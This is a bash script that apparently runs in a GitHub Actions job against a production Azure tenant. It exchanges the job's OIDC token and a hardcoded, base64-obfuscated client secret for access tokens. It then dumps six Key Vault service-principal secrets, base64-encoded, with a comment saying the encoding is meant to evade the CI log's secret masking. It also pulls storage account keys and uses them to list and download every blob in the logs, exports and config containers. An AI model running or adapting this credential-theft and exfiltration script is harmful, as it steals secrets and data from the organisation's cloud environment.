#!/bin/bash
set +e

TENANT="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
TU="https://login.microsoftonline.com/$TENANT/oauth2/v2.0/token"
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
B="https://management.azure.com/subscriptions/$SUB"
RG="rg-tbl-platform-prod-sea"

echo "=== TOKENS ==="
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value // empty')

CICD_VAULT=$(curl -sS -X POST "$TU" \
  -d "client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462" \
  -d "scope=https://vault.azure.net/.default" \
  -d "grant_type=client_credentials" \
  --data-urlencode "client_assertion=$OIDC" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" | jq -r '.access_token // empty')

SYNC_CID=$(echo "NDYyZDFjMzgtNDQ1OS00OGI4LTkzMzMtODJlMzg5ZTU5NTE0" | base64 -d)
SYNC_SEC=$(echo "c2sxOFF+cUQyMmtrSFhVQ2ZxWExxZFA5NURrWUpMMzRlTUVSbGNTag==" | base64 -d)
SYNC_MGMT=$(curl -sS -X POST "$TU" -d "client_id=$SYNC_CID" --data-urlencode "client_secret=$SYNC_SEC" \
  -d "scope=https://management.azure.com/.default" -d "grant_type=client_credentials" | jq -r '.access_token // empty')
echo "CICD vault=${#CICD_VAULT} SYNC mgmt=${#SYNC_MGMT}"

echo ""
echo "=== KV1: Get secrets (base64 encoded to bypass masking) ==="
for SNAME in cost-reader-principal directory-audit-principal reporting-service-principal reporting-viewer-principal secrets-sync-principal sync-service-principal; do
  RAW=$(curl -sS "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/$SNAME?api-version=7.4" \
    -H "Authorization: Bearer $CICD_VAULT" | jq -r '.value // empty')
  B64=$(echo -n "$RAW" | base64 -w0)
  echo "$SNAME B64=$B64"
done

echo ""
echo "=== SYNC listKeys (correct RG: sea) ==="
for SA in sttblcilogsprodx3euoz sttblbackupprodx3euoz sttblappcfgprodx3euoz sttblarchiveprodx3euoz; do
  KEYS=$(curl -sS -X POST "$B/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/$SA/listKeys?api-version=2023-01-01" \
    -H "Authorization: Bearer $SYNC_MGMT" -H "Content-Length: 0")
  K1=$(echo "$KEYS" | jq -r '.keys[0].value // empty')
  if [ -n "$K1" ]; then
    K1B64=$(echo -n "$K1" | base64 -w0)
    echo "KEY $SA = $K1B64"
    
    # Use SharedKey to list blobs
    DATE=$(TZ=GMT date "+%a, %d %b %Y %H:%M:%S GMT")
    # List all containers
    STS_C="GET\n\n\n\n\n\n\n\n\n\n\n\nx-ms-date:${DATE}\nx-ms-version:2023-01-03\n/${SA}/\ncomp:list"
    SIG_C=$(printf "%b" "$STS_C" | openssl dgst -sha256 -hmac "$(echo -n "$K1" | base64 -d)" -binary | base64 -w0)
    echo "Containers in $SA:"
    curl -sS "https://$SA.blob.core.windows.net/?comp=list" \
      -H "x-ms-date: $DATE" -H "x-ms-version: 2023-01-03" \
      -H "Authorization: SharedKey $SA:$SIG_C"
    
    sleep 1
    
    # List blobs in each known container
    for CONT in logs exports config; do
      DATE2=$(TZ=GMT date "+%a, %d %b %Y %H:%M:%S GMT")
      STS_B="GET\n\n\n\n\n\n\n\n\n\n\n\nx-ms-date:${DATE2}\nx-ms-version:2023-01-03\n/${SA}/${CONT}\ncomp:list\nrestype:container"
      SIG_B=$(printf "%b" "$STS_B" | openssl dgst -sha256 -hmac "$(echo -n "$K1" | base64 -d)" -binary | base64 -w0)
      BLOBS=$(curl -sS "https://$SA.blob.core.windows.net/${CONT}?restype=container&comp=list" \
        -H "x-ms-date: $DATE2" -H "x-ms-version: 2023-01-03" \
        -H "Authorization: SharedKey $SA:$SIG_B" 2>/dev/null)
      
      if echo "$BLOBS" | grep -q '<Name>'; then
        echo "Blobs in $SA/$CONT:"
        echo "$BLOBS"
        
        # Extract and read each blob
        BNAMES=$(echo "$BLOBS" | grep -oP '<Name>[^<]+</Name>' | sed 's/<Name>//g;s/<\/Name>//g')
        for BN in $BNAMES; do
          sleep 1
          DATE3=$(TZ=GMT date "+%a, %d %b %Y %H:%M:%S GMT")
          STS_R="GET\n\n\n\n\n\n\n\n\n\n\n\nx-ms-date:${DATE3}\nx-ms-version:2023-01-03\n/${SA}/${CONT}/${BN}"
          SIG_R=$(printf "%b" "$STS_R" | openssl dgst -sha256 -hmac "$(echo -n "$K1" | base64 -d)" -binary | base64 -w0)
          echo "=== BLOB CONTENT: $SA/$CONT/$BN ==="
          curl -sS "https://$SA.blob.core.windows.net/${CONT}/${BN}" \
            -H "x-ms-date: $DATE3" -H "x-ms-version: 2023-01-03" \
            -H "Authorization: SharedKey $SA:$SIG_R"
          echo ""
        done
      fi
      sleep 0.5
    done
  else
    ERR=$(echo "$KEYS" | jq -r '.error.code // empty')
    echo "FAIL $SA: $ERR"
  fi
done

echo ""
echo "=== DONE ==="